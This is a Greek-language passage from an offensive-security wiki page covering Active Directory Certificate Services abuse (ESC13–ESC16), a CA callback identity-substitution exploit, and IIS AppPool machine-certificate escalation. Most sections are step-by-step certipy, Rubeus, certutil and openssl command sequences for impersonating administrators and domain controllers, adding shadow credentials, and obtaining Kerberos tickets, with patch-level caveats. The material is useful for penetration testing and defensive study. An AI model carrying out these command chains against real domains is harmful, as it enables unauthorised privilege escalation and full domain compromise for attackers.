Το attribute `msPKI-Certificate-Policy` επιτρέπει την προσθήκη της πολιτικής έκδοσης στο certificate template. Τα αντικείμενα `msPKI-Enterprise-Oid`, τα οποία είναι υπεύθυνα για την έκδοση πολιτικών, μπορούν να εντοπιστούν στο Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) του PKI OID container. Μια πολιτική μπορεί να συνδεθεί με μια ομάδα AD μέσω του attribute `msDS-OIDToGroupLink` αυτού του αντικειμένου, επιτρέποντας σε ένα σύστημα να εξουσιοδοτεί έναν χρήστη που παρουσιάζει το πιστοποιητικό σαν να ήταν μέλος της ομάδας. [Αναφορά εδώ](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Με άλλα λόγια, όταν ένας χρήστης έχει δικαίωμα εγγραφής για ένα πιστοποιητικό και το πιστοποιητικό είναι συνδεδεμένο με μια ομάδα OID, ο χρήστης μπορεί να αποκτήσει τα προνόμια αυτής της ομάδας.

Χρησιμοποιήστε το [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) για να εντοπίσετε το OIDToGroupLink:

```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```

### Σενάριο Κατάχρησης

Εντοπίστε έναν χρήστη με δικαίωμα που μπορείτε να αξιοποιήσετε με `certipy find` ή `Certify.exe find /showAllPermissions`.

Αν ο `John` έχει δικαίωμα να κάνει enroll στο `VulnerableTemplate`, μπορεί να κληρονομήσει τα προνόμια της ομάδας `VulnerableGroup`.

Το μόνο που χρειάζεται να κάνει είναι να καθορίσει το template· θα λάβει ένα certificate με δικαιώματα OIDToGroupLink.

```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```

## Κατάχρηση Explicit Certificate Mapping — ESC14

### Επεξήγηση

Η περιγραφή στη διεύθυνση https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping είναι εξαιρετικά αναλυτική. Ακολουθεί απόσπασμα από το αρχικό κείμενο.<sup>[[14]](#references)</sup>

Το ESC14 αφορά ευπάθειες που οφείλονται σε «αδύναμη explicit certificate mapping», κυρίως μέσω κακής χρήσης ή μη ασφαλούς ρύθμισης του attribute `altSecurityIdentities` σε λογαριασμούς χρηστών ή υπολογιστών του Active Directory. Αυτό το attribute πολλαπλών τιμών επιτρέπει στους διαχειριστές να αντιστοιχίζουν χειροκίνητα πιστοποιητικά X.509 με έναν λογαριασμό AD για σκοπούς authentication. Όταν συμπληρωθούν, αυτές οι explicit mappings μπορούν να παρακάμψουν την προεπιλεγμένη λογική αντιστοίχισης πιστοποιητικών, η οποία συνήθως βασίζεται σε UPN ή DNS names στο SAN του πιστοποιητικού ή στο SID που είναι ενσωματωμένο στο security extension `szOID_NTDS_CA_SECURITY_EXT`.

Μια «αδύναμη» mapping προκύπτει όταν η τιμή συμβολοσειράς που χρησιμοποιείται στο attribute `altSecurityIdentities` για την αναγνώριση ενός πιστοποιητικού είναι υπερβολικά γενική, εύκολα προβλέψιμη, βασίζεται σε μη μοναδικά πεδία πιστοποιητικού ή χρησιμοποιεί στοιχεία πιστοποιητικού που μπορούν εύκολα να πλαστογραφηθούν. Αν ένας attacker μπορέσει να αποκτήσει ή να κατασκευάσει πιστοποιητικό του οποίου τα attributes ταιριάζουν με μια τέτοια αδύναμη explicit mapping για έναν προνομιούχο λογαριασμό, μπορεί να χρησιμοποιήσει αυτό το πιστοποιητικό για authentication ως ο συγκεκριμένος λογαριασμός και να τον υποδυθεί.

Παραδείγματα δυνητικά αδύναμων συμβολοσειρών mapping του `altSecurityIdentities` περιλαμβάνουν:

- Αντιστοίχιση αποκλειστικά βάσει ενός συνηθισμένου Subject Common Name (CN): π.χ., `X509:<S>CN=SomeUser`. Ένας attacker ενδέχεται να μπορέσει να αποκτήσει πιστοποιητικό με αυτό το CN από λιγότερο ασφαλή πηγή.
- Χρήση υπερβολικά γενικών Issuer Distinguished Names (DN) ή Subject DN χωρίς πρόσθετο περιορισμό, όπως συγκεκριμένο serial number ή subject key identifier: π.χ., `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Χρήση άλλων προβλέψιμων μοτίβων ή μη κρυπτογραφικών αναγνωριστικών που ένας attacker ενδέχεται να μπορέσει να ικανοποιήσει σε πιστοποιητικό το οποίο μπορεί να αποκτήσει νόμιμα ή να πλαστογραφήσει (αν έχει παραβιάσει μια CA ή έχει εντοπίσει ένα ευάλωτο template, όπως στο ESC1).

Το attribute `altSecurityIdentities` υποστηρίζει διάφορες μορφές αντιστοίχισης, όπως:

- `X509:<I>IssuerDN<S>SubjectDN` (αντιστοίχιση βάσει του πλήρους Issuer και Subject DN)
- `X509:<SKI>SubjectKeyIdentifier` (αντιστοίχιση βάσει της τιμής του extension Subject Key Identifier του πιστοποιητικού)
- `X509:<SR>SerialNumberBackedByIssuerDN` (αντιστοίχιση βάσει serial number, το οποίο προσδιορίζεται έμμεσα από το Issuer DN) — αυτή δεν είναι τυπική μορφή· συνήθως είναι `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (αντιστοίχιση βάσει ονόματος RFC822, συνήθως διεύθυνσης email, από το SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (αντιστοίχιση βάσει SHA1 hash του ακατέργαστου δημόσιου κλειδιού του πιστοποιητικού — γενικά ισχυρή)

Η ασφάλεια αυτών των mappings εξαρτάται από τα αναγνωριστικά που χρησιμοποιούνται. Η Microsoft χαρακτηρίζει ως **αδύναμες** τις mappings που βασίζονται σε email ή subject names, συμπεριλαμβανομένης της `X509:<RFC822>`. Στη λειτουργία Full Enforcement, ένα πιστοποιητικό χωρίς ισχυρή mapping απορρίπτεται· η ενημέρωση ασφαλείας των Windows του Σεπτεμβρίου 2025 αφαίρεσε τη δυνατότητα επιστροφής στη λειτουργία Compatibility. Επομένως, μια αδύναμη mapping από μόνη της δεν αποτελεί αξιόπιστο τρέχον μονοπάτι impersonation. Ελέγξτε το πραγματικό επίπεδο ενημερώσεων του domain controller και τη συμπεριφορά αντιστοίχισης πιστοποιητικών προτού αξιολογήσετε ένα σενάριο αδύναμης mapping. Η δυνατότητα εγγραφής στο `altSecurityIdentities` αποτελεί ξεχωριστό στοιχείο προς διερεύνηση: ένας attacker με κατάλληλο έμπιστο πιστοποιητικό ενδέχεται να μπορεί να προσθέσει μια **ισχυρή** explicit mapping, ανάλογα με τα ισχύοντα δικαιώματα και την επικύρωση του πιστοποιητικού. Δείτε το [Microsoft KB5014754](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) και την [έρευνα για το ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/).

Χρειάζεται επίσης διερεύνηση των αποτυχιών authentication με πιστοποιητικό: ένας απενεργοποιημένος λογαριασμός-στόχος ή ένας ληγμένος κωδικός πρόσβασης μπορεί να εμποδίσει τη σύνδεση, ακόμη κι αν το ίδιο το πιστοποιητικό εξακολουθεί να είναι έγκυρο.

### Σενάριο κατάχρησης

Το ESC14 στοχεύει τις **explicit certificate mappings** στο Active Directory (AD), συγκεκριμένα το attribute `altSecurityIdentities`. Αν αυτό το attribute έχει οριστεί (σκόπιμα ή λόγω εσφαλμένης ρύθμισης), οι attackers μπορούν να υποδυθούν λογαριασμούς παρουσιάζοντας πιστοποιητικά που ταιριάζουν με τη mapping.

#### Σενάριο A: Ο attacker μπορεί να γράψει στο `altSecurityIdentities`

 **Προϋπόθεση**: Ο attacker έχει δικαιώματα εγγραφής στο attribute `altSecurityIdentities` του λογαριασμού-στόχου ή δικαίωμα να του εκχωρήσει ένα από τα ακόλουθα δικαιώματα στο αντικείμενο AD-στόχο:  
- Write property `altSecurityIdentities`  
- Write property `Public-Information`  
- Write property (all)  
- `WriteDACL`  
- `WriteOwner`*  
- `GenericWrite`  
- `GenericAll`  
- Owner*.
#### Σενάριο B: Ο στόχος έχει αδύναμη mapping μέσω X509RFC822 (email)

- **Ιστορική/υπό όρους προϋπόθεση**: Ο στόχος έχει αδύναμη mapping X509RFC822 στο `altSecurityIdentities`, ο attacker μπορεί να επεξεργαστεί το attribute `mail` ενός enrollee και ένα κατάλληλο template περιλαμβάνει αυτό το email σε πιστοποιητικό client-authentication χωρίς αντικρουόμενη SID binding. Για το authentication απαιτείται επίσης ένα περιβάλλον που εξακολουθεί να αποδέχεται την αδύναμη mapping· η λειτουργία Full Enforcement απορρίπτει certificate mappings που βασίζονται μόνο σε αδύναμη mapping. Η δυνατότητα εγγραφής στο attribute `mail` από μόνη της είναι απλώς ένα στοιχείο προς διερεύνηση.
#### Σενάριο C: Ο στόχος έχει mapping X509IssuerSubject

- **Προϋπόθεση**: Ο στόχος έχει αδύναμη explicit mapping X509IssuerSubject στο `altSecurityIdentities`. Ο attacker μπορεί να ορίσει το attribute `cn` ή `dNSHostName` σε μια victim principal ώστε να ταιριάζει με το subject της mapping X509IssuerSubject του στόχου. Έπειτα, ο attacker μπορεί να κάνει enroll για πιστοποιητικό ως η victim και να χρησιμοποιήσει αυτό το πιστοποιητικό για authentication ως ο στόχος.
#### Σενάριο D: Ο στόχος έχει mapping X509SubjectOnly

- **Προϋπόθεση**: Ο στόχος έχει αδύναμη explicit mapping X509SubjectOnly στο `altSecurityIdentities`. Ο attacker μπορεί να ορίσει το attribute `cn` ή `dNSHostName` σε μια victim principal ώστε να ταιριάζει με το subject της mapping X509SubjectOnly του στόχου. Έπειτα, ο attacker μπορεί να κάνει enroll για πιστοποιητικό ως η victim και να χρησιμοποιήσει αυτό το πιστοποιητικό για authentication ως ο στόχος.
### Συγκεκριμένες ενέργειες
#### Σενάριο A

Ζητήστε ένα πιστοποιητικό από το certificate template `Machine`

```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```

 Αποθηκεύστε και μετατρέψτε το πιστοποιητικό

```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```

 Έλεγχος ταυτότητας (με χρήση του πιστοποιητικού)

```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```

Καθαρισμός (προαιρετικός)

```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```

Για πιο συγκεκριμένες μεθόδους επίθεσης σε διάφορα σενάρια, ανατρέξτε στο εξής: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## Πολιτικές εφαρμογών EKUwu (CVE-2024-49019) - ESC15

### Επεξήγηση

Η [αρχική έρευνα για το ESC15](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc) εξηγεί πώς οι πολιτικές εφαρμογών που περιλαμβάνονται σε ένα αίτημα για πρότυπο V1 μπορούν να παρακάμψουν το διαμορφωμένο Extended Key Usage σε μια **μη ενημερωμένη issuing CA**.<sup>[[15]](#references)</sup> Απαιτείται επίσης ένα διαθέσιμο πρότυπο που έχει δημοσιευτεί, επιτρέπει enrollment και δέχεται τις απαραίτητες ιδιότητες subject/request, χωρίς να απαιτεί έγκριση ή υπογραφή που εμποδίζει την έκδοση. Τα δικαιώματα enrollment από μόνα τους δεν αποδεικνύουν ότι είναι δυνατή η εκμετάλλευση. Η χρήση του Certificate Request Agent μπορεί επιπλέον να εξαρτάται από την ύπαρξη κατάλληλου δεύτερου προτύπου και από τους περιορισμούς του enrollment agent· επιβεβαιώστε την κατάσταση των ενημερώσεων της CA και το αποτέλεσμα της έκδοσης πριν ισχυριστείτε ότι είναι δυνατή αυτή η μέθοδος.

### Κατάχρηση

Η [τεκμηρίωση privilege escalation του Certipy](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) περιέχει αναλυτικότερα παραδείγματα χρήσης.<sup>[[14]](#references)</sup>


Η εντολή `find` του Certipy μπορεί να βοηθήσει στον εντοπισμό προτύπων V1 που ενδέχεται να είναι ευάλωτα στο ESC15, αν η CA δεν έχει ενημερωθεί.

```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```

#### Σενάριο A: Άμεση πλαστοπροσωπία μέσω Schannel

**Βήμα 1: Ζητήστε ένα πιστοποιητικό, εισάγοντας την πολιτική εφαρμογής "Client Authentication" και το UPN του στόχου.** Ο attacker `attacker@corp.local` στοχεύει τον `administrator@corp.local` χρησιμοποιώντας το πρότυπο V1 "WebServer" (το οποίο επιτρέπει subject που παρέχεται από τον εγγεγραμμένο χρήστη).

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
    -application-policies 'Client Authentication'
```

- `-template 'WebServer'`: Το ευάλωτο πρότυπο V1 με την επιλογή "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Εισάγει το OID `1.3.6.1.5.5.7.3.2` στην επέκταση Application Policies του CSR.
- `-upn 'administrator@corp.local'`: Ορίζει το UPN στο SAN για impersonation.

**Βήμα 2: Κάντε authenticate μέσω Schannel (LDAPS) χρησιμοποιώντας το πιστοποιητικό που αποκτήθηκε.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```

#### Σενάριο B: Πλαστοπροσωπία μέσω PKINIT/Kerberos με κατάχρηση του Enrollment Agent

**Βήμα 1: Ζητήστε ένα πιστοποιητικό από ένα πρότυπο V1 (με την επιλογή "Enrollee supplies subject"), εισάγοντας την Application Policy "Certificate Request Agent".** Αυτό το πιστοποιητικό προορίζεται για τον attacker (`attacker@corp.local`), ώστε να γίνει enrollment agent. Δεν καθορίζεται UPN για την ταυτότητα του ίδιου του attacker, καθώς ο στόχος είναι η δυνατότητα agent.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
```

- `-application-policies 'Certificate Request Agent'`: Εισάγει το OID `1.3.6.1.4.1.311.20.2.1`.

**Βήμα 2: Χρησιμοποιήστε το πιστοποιητικό «agent» για να ζητήσετε πιστοποιητικό για λογαριασμό ενός προνομιούχου χρήστη-στόχου.** Πρόκειται για ένα βήμα τύπου ESC3, το οποίο χρησιμοποιεί το πιστοποιητικό του Βήματος 1 ως πιστοποιητικό agent.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```

**Βήμα 3: Αυθεντικοποιηθείτε ως ο προνομιούχος χρήστης χρησιμοποιώντας το πιστοποιητικό "on-behalf-of".**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

## Η επέκταση ασφαλείας είναι απενεργοποιημένη στην CA (καθολικά)-ESC16

### Επεξήγηση

**ESC16 (Κλιμάκωση προνομίων μέσω απουσίας της επέκτασης szOID_NTDS_CA_SECURITY_EXT)** περιγράφει την καθολική για την CA καταστολή της επέκτασης SID **szOID_NTDS_CA_SECURITY_EXT**. Αυτό αποτελεί ένδειξη διαμόρφωσης, όχι απόδειξη ότι ένα πιστοποιητικό μπορεί να πραγματοποιήσει έλεγχο ταυτότητας ως άλλος λογαριασμός. Η πλαστοπροσωπία απαιτεί επίσης έλεγχο των σχετικών χαρακτηριστικών ή αντιστοίχισης του λογαριασμού, ενός προτύπου ελέγχου ταυτότητας client που επιτρέπει εγγραφή και μιας διαδρομής αντιστοίχισης πιστοποιητικού που γίνεται αποδεκτή από τον πραγματικό domain controller ή την υπηρεσία. Ένας ενημερωμένος KDC σε λειτουργία Full Enforcement απορρίπτει πιστοποιητικά χωρίς επέκταση SID, εκτός αν διαθέτουν άλλη ισχυρή αντιστοίχιση· η παρακάτω διαδικασία Kerberos μόνο με UPN αφορά παλαιότερους KDC ή KDC σε λειτουργία συμβατότητας, οι οποίοι εξακολουθούν να αποδέχονται ασθενή αντιστοίχιση. Δείτε τις [οδηγίες της Microsoft για την αντιστοίχιση πιστοποιητικών και την επιβολή πολιτικών](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Μπορείτε επίσης να ανατρέξετε σε αυτό το άρθρο για να μάθετε περισσότερα σχετικά με τη λεπτομερή αρχή:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Κατάχρηση

Το ακόλουθο ιστορικό παράδειγμα Kerberos μόνο με UPN βασίζεται στην [τεκμηρίωση του Certipy για το ESC16](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally). Απαιτείται ένας KDC που εξακολουθεί να αποδέχεται την ασθενή αντιστοίχιση που προκύπτει· το `StrongCertificateBindingEnforcement=1` δεν αποτελεί πλέον υποστηριζόμενη παράκαμψη μετά την ενημέρωση ασφαλείας των Windows της 9ης Σεπτεμβρίου 2025.<sup>[[14]](#references)</sup>

Για να προσδιορίσετε αν το περιβάλλον Active Directory Certificate Services (AD CS) είναι ευάλωτο στο **ESC16**

```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```

**Βήμα 1: Διαβάστε το αρχικό UPN του λογαριασμού του θύματος (Προαιρετικό - για επαναφορά).  


```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -user 'victim' \
    read
```

**Βήμα 2: Ενημερώστε το UPN του λογαριασμού-θύματος ώστε να είναι ίδιο με το `sAMAccountName` του λογαριασμού διαχειριστή-στόχου.  

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'administrator' \
    -user 'victim' update
```

**Βήμα 3: (Αν χρειάζεται) Αποκτήστε διαπιστευτήρια για τον λογαριασμό «θύματος» (π.χ. μέσω Shadow Credentials).**

```shell
certipy shadow \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -account 'victim' \
    auto
```

**Βήμα 4: Ζητήστε ένα πιστοποιητικό ως ο χρήστης «victim» από ένα template ελέγχου ταυτότητας πελάτη στο οποίο ο λογαριασμός μπορεί να εγγραφεί (π.χ. «User»), στην CA που έχει ρυθμιστεί με ESC16.** Η CA παραλείπει την επέκταση ασφαλείας SID από το πιστοποιητικό που εκδίδει, αλλά αυτό από μόνο του δεν δημιουργεί μια αξιοποιήσιμη αντιστοίχιση ελέγχου ταυτότητας. Ορίστε τη μεταβλητή περιβάλλοντος για την cache διαπιστευτηρίων Kerberos (εντολή shell):

```bash
export KRB5CCNAME=victim.ccache
```

Στη συνέχεια, ζητήστε το πιστοποιητικό:

```bash
certipy req \
    -k -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
    -template 'User'
```

**Βήμα 5: Επαναφέρετε το UPN του λογαριασμού "victim".**

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
    -user 'victim' update
```

**Βήμα 6: Σε παλαιότερο KDC ή KDC σε λειτουργία συμβατότητας που αποδέχεται αυτήν την αδύναμη αντιστοίχιση, πραγματοποιήστε έλεγχο ταυτότητας ως ο διαχειριστής-στόχος.**

```bash
certipy auth \
    -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'corp.local'
```

## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### Επεξήγηση

Το **Certighost** καταχράται μια **διαδρομή enrollment chase / callback του AD CS**, στην οποία η CA εμπιστεύεται attributes αιτήματος που παρέχει ο αιτών για να προσδιορίσει την ταυτότητα που θα περιληφθεί στο εκδιδόμενο certificate. Στο δημόσιο PoC, το crafted request περιλαμβάνει:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: host/IP που ελέγχει ο attacker και με τον οποίο θα επικοινωνήσει η CA
- **`rmd`**: το **DNS name του target Domain Controller** που θα πλαστοπροσωπηθεί

Αν η CA ακολουθήσει αυτό το chase, θα συνδεθεί με τον attacker μέσω **SMB/LSA (`445`)** και **LDAP (`389`)**. Ο attacker χρησιμοποιεί έναν **πραγματικό machine account** (συνήθως δημιουργημένο μέσω του προεπιλεγμένου **`ms-DS-MachineAccountQuota`**), ώστε η callback session να πιστοποιείται ως έγκυρο domain principal, αλλά οι rogue υπηρεσίες επιστρέφουν τα attributes ταυτότητας του **target DC**:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Αν η CA **δεν συνδέει κρυπτογραφικά την ταυτότητα που επιστρέφεται με το authenticated callback principal**, μπορεί να εκδώσει certificate για τον **Domain Controller**, παρόλο που η session πιστοποιήθηκε με τον machine account που ελέγχει ο attacker. Έτσι, το bug διαφέρει εννοιολογικά από το **Certifried**: αντί να τροποποιεί AD attributes όπως το `dNSHostName`, ο attacker **αντικαθιστά δεδομένα ταυτότητας κατά την επίλυση callback της CA**.<sup>[[2]](#references)</sup>

**Χρήσιμες προϋποθέσεις:**

- **Domain credentials** χαμηλών δικαιωμάτων
- Δυνατότητα **δημιουργίας ή επαναχρησιμοποίησης computer account**
- Δικτυακή προσβασιμότητα από την **CA** στις θύρες **`389` και `445`** που ελέγχει ο attacker
- Ευάλωτη / μη ενημερωμένη διαδρομή αιτήματος της CA (η ενημέρωση της Microsoft της **14ης Ιουλίου 2026** πρόσθεσε **DC validation για το `cdc`** και **σύγκριση resolved SID**)

Το **`.pfx`** που προκύπτει μπορεί έπειτα να χρησιμοποιηθεί για **PKINIT**, δημιουργώντας ένα **`.ccache`** και, στη ροή του δημοσιευμένου PoC, το **NT hash του target DC**, κάτι που συνήθως αρκεί για **πλήρη παραβίαση του domain**.

### Εκμετάλλευση

Το δημόσιο PoC αυτοματοποιεί ολόκληρη την αλυσίδα:<sup>[[1]](#references)</sup>

1. Δημιουργεί ή επαναχρησιμοποιεί έναν **machine account** που ελέγχει ο attacker.
2. Εκκινεί **rogue LDAP και SMB/LSA listeners** στις θύρες `389` και `445`.
3. Υποβάλλει ένα certificate request με attributes **`cdc`** που ελέγχει ο attacker και **`rmd`** του target.
4. Αφήνει την CA να πιστοποιηθεί στους rogue listeners ως ο ελεγχόμενος machine account, αλλά απαντά στα identity lookups με τα attributes του **target DC**.
5. Λαμβάνει ένα **DC certificate** υπογεγραμμένο από την CA και έπειτα το χρησιμοποιεί για **PKINIT**.

```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```

Χρήσιμα runtime flags από το PoC:

- `--listener <ip>`: επιλέγει ρητά τη callback IP που ανακοινώνεται στο `cdc`
- `--computer-name <NAME$>`: επαναχρησιμοποιεί έναν υπάρχοντα machine account αντί να δημιουργήσει νέο

**Λειτουργικές σημειώσεις:**

- Το PoC χρειάζεται **root**, επειδή δεσμεύει τις **privileged ports** `389` και `445`.
- Η επιτυχής εκμετάλλευση αποθηκεύει το **DC `.pfx`** και το **Kerberos `.ccache`** τοπικά.
- Επειδή το certificate αντιστοιχίζεται σε λογαριασμό **Domain Controller**, οι επόμενες ενέργειες μπορούν να περιλαμβάνουν **certificate-based Kerberos auth**, **DCSync** και επαναχρησιμοποίηση του ανακτημένου **machine NT hash**.<sup>[[2]](#references)</sup>

## Εγγραφή μηχανήματος από IIS AppPool για πρόσβαση Administrator στο ίδιο host

Ένα IIS pool που εκτελείται ως `ApplicationPoolIdentity` χρησιμοποιεί τον **λογαριασμό υπολογιστή** του host για εξερχόμενη πρόσβαση σε πόρους δικτύου. Επομένως, η εκτέλεση κώδικα ως `IIS AppPool\<POOL>` παραμένει με χαμηλά δικαιώματα στο τοπικό token, αλλά μπορεί να υποβάλει αίτημα AD CS που η CA αυθεντικοποιεί ως `HOST$`. Πρόκειται για μετάβαση εξερχόμενης ταυτότητας, όχι για token impersonation ή τοπική ανύψωση τύπου Potato.<sup>[[19]](#references)[[20]](#references)</sup>

Αυτή η αλυσίδα απαιτεί domain-joined IIS host, Enterprise CA προσβάσιμη μέσω RPC, δημοσιευμένο template machine-authentication για το οποίο ο υπολογιστής έχει δικαιώματα enrollment, υποστήριξη PKINIT και πρόσβαση σε KDC/SMB. Μια custom pool identity αλλάζει το outbound principal, επομένως επιβεβαιώστε ότι το pool χρησιμοποιεί πράγματι `ApplicationPoolIdentity` πριν υποθέσετε ότι είναι `HOST$`.<sup>[[19]](#references)[[20]](#references)</sup>

### Εγγραφή με κλειδί υπό τον έλεγχο του επιτιθέμενου

Δημιουργήστε το key pair και το CSR εκτός του IIS server και διατηρήστε το private key. Υποβάλετε **μόνο το CSR** από το compromised worker. Το [Certi-Bhai ASPX PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) δημιουργεί το `CertificateAuthority.Request`, ορίζει το `CertificateTemplate:Machine`, καλεί το `ICertRequest::Submit` και επιστρέφει το εκδοθέν certificate. Χρησιμοποιήστε το CA configuration string `CAHOST\CA-NAME`. Ένα τυπικό template `Machine` δημιουργεί το subject από το AD, επομένως δεν απαιτούνται requester-supplied δεδομένα subject/SAN.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

Συνδυάστε το certificate που επιστράφηκε με το **αντίστοιχο private key που διατηρήσατε**. Το `certutil -MergePFX machine_cert.cer machine_cert.pfx` λειτουργεί μόνο όταν τα Windows μπορούν ήδη να συσχετίσουν το certificate με ένα προσβάσιμο private key. Για ξεχωριστά αρχεία PEM, δημιουργήστε ρητά ένα PKCS#12:<sup>[[19]](#references)[[23]](#references)</sup>

```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
  -out machine_cert.pfx -name 'HOST$'
```

Χρησιμοποιήστε το PFX για PKINIT και διατηρήστε το TGT του υπολογιστή που επιστράφηκε σε μορφή base64, αντί να το κάνετε inject αμέσως:<sup>[[5]](#references)[[19]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
  /password:PFX_PASSWORD /nowrap
```

### S4U2Self και αντικατάσταση υπηρεσίας στον ίδιο host

Το S4U2Self επιτρέπει σε μια υπηρεσία να αποκτήσει ένα ticket **προς την ίδια**, το οποίο περιέχει τα δεδομένα εξουσιοδότησης ενός άλλου χρήστη. Με το TGT του υπολογιστή, το Rubeus μπορεί να ζητήσει αυτό το ticket για έναν προνομιούχο χρήστη, να αλλάξει το όνομα της υπηρεσίας στο KRB-CRED που επιστρέφεται σε CIFS και να το εισαγάγει. Αυτό είναι το τοπικό primitive «delegate to thyself»: δεν απαιτεί S4U2Proxy ή καταχώριση `msDS-AllowedToDelegateTo`.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>

```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
  /altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```

Το υποκατεστημένο ticket μπορεί να χρησιμοποιηθεί μόνο από υπηρεσίες στον **ίδιο λογαριασμό/κλειδί υπολογιστή** (εδώ, από το CIFS στο `HOST`). Δεν είναι επαναχρησιμοποιήσιμο ticket Administrator για άλλους υπολογιστές του domain. Επίσης, το αποτέλεσμα που παρουσιάζεται είναι προνομιακή πρόσβαση SMB/συστήματος αρχείων ως Administrator· για την απόκτηση μιας τοπικής διεργασίας `NT AUTHORITY\SYSTEM` απαιτείται ξεχωριστό βήμα απομακρυσμένης εκτέλεσης.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Ανίχνευση και ενίσχυση της ασφάλειας

